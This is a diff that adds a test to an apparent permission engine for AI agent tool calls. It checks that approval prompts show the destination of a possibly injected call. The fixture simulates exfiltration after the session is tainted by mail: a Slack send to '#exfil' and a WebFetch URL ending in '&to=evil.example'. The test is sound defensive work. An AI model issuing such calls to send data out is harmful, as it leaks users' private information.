@@ -486,6 +486,17 @@ describe('persistence', () => {
 })
 
 describe('review fixes', () => {
+  test('an ask names the destination first and keeps the end of a long call', async ($, on) => {
+    const kit = engine(on, { files: EXAMPLE, answers: ['Refuse', 'Refuse'] })
+    await taintWithMail($, kit)
+    await call($, 'mcp__slack__send_message', { text: 'x'.repeat(200), channel: '#exfil' })
+    expect(kit.asked[0]?.question).toContain(`Allow mcp__slack__send_message ({"channel":"#exfil","text":"${'x'.repeat(200)}"}) once?`)
+    await call($, 'WebFetch', { url: `https://example.com/?q=${'a'.repeat(700)}&to=evil.example`, prompt: 'read' })
+    const question = kit.asked[1]?.question ?? ''
+    expect(question).toContain(' … ')
+    expect(question).toContain('&to=evil.example) once?')
+  })
+
   test('a managed lock keeps a user policy from turning sinks into audit', { options: { preset: 'none' } }, async ($, on) => {
     const kit = engine(on, {
       files: { [USER_POLICY]: policyFile({ ...EXAMPLE_POLICY, mode: 'audit' }) },
